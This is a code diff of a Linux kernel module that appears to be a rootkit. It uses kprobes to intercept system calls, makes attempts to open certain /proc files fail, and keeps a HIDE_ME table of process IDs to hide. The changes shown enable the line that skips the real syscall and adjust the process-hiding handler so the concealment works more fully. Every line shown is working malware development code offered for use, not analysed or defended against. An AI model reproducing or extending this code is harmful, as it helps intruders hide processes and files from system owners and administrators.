@@ -114,12 +114,12 @@ static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
   return *stack;
 }
 
-typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
-static t_syscall orig_getdents;
-static t_syscall orig_getdents64;
-static t_syscall orig_kill;
+// static asmlinkage long (*original_openat)(const struct pt_regs *);
+// asmlinkage int hook_listing_proc(const struct pt_regs *regs) {
+//   return original_openat(regs);
+// }
 
-int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
+static int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
   struct pt_regs *real_regs;
   const char __user *user_filename;
   char filename[256];
@@ -139,7 +139,7 @@ int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
           printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
                  current->comm, current->pid);
           regs->ax = -ENOENT;
-          // regs->ip = get_syscall_return_addr(regs);
+          regs->ip = get_syscall_return_addr(regs);
           return 1;
         }
       }
@@ -187,7 +187,7 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
     // hide processes
     int i;
     if (kill_this_pid == 0) {
-      return 0;
+      return 1;
     }
     for (i = 0; i < 32; i++) {
       if (HIDE_ME[i] == kill_this_pid) {
@@ -195,6 +195,7 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
         HIDE_ME[i] = 0;
         HIDE_ME_COUNT--;
         regs->ax = 0;
+        regs->orig_ax = 0;
         regs->ip = get_syscall_return_addr(regs);
         return 1;
       }
